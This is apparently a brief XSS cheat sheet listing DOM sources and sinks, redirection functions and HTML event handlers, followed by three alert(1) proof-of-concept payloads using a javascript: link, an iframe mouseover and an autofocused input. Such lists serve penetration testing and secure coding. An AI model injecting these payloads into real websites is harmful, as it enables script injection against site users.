### DOM based XSS:
```
document.body.innerHtml
document.location
document.referrer
document.URL
document.URLUnencoded
document.write()
document.writeln()
eval()
window.execScript()
window.location
window.setInterval()
window.setTimeout()
```

### XSS redirection:
```
document.location
document.open()
document.URL
window.location.href
window.navigate()
window.open()
```

### eventhandler
```
onabort
onblur
onchange
onclick
ondblclick
onerror
onfocus
onkeydown
onkeypress
onkeyup
onload
onmousedown
onmousemove
onmouseout
onmouseover
onmouseup
onreadystatechange
onreset
onselect
onsubmit
onunload
```

### examples
```
<a href="javascript:alert(1)">
<iframe onmouseover=alert(1)>
<input autofocus onfocus=alert(1)>
```

